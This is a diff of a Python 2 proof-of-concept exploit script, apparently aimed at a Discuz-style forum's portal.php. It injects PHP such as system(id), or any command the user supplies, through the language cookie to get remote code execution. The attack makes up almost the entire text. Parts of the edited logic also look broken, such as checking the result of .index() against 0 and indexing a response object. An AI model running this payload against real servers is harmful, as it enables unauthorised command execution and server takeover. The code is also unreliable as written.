@@ -15,12 +15,16 @@ def poc(url,eexec):
 	else:
 		url = 'http://'+url+'/portal.php'
 	sign = requests.get(url).headers['Set-cookie'][:9]
-	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
-	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=10).text.encode('gbk', 'ignore').decode('gbk')[0:80]
-	if 'groups=' not in res:
+	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.system(id).';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,sign,sign,sign,sign)
+	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5).text.index('<!DOCTYPE html PUBLIC')
+	if res ==0:
 		print '%s not is vulnerable!' % url
 		sys.exit()
-	print res
+	else:
+		cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
+		res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5)
+		flag = res.text.index('<!DOCTYPE html PUBLIC')
+		print res[flag]
 	
 if __name__ == '__main__':
 	if len(sys.argv) <=2:
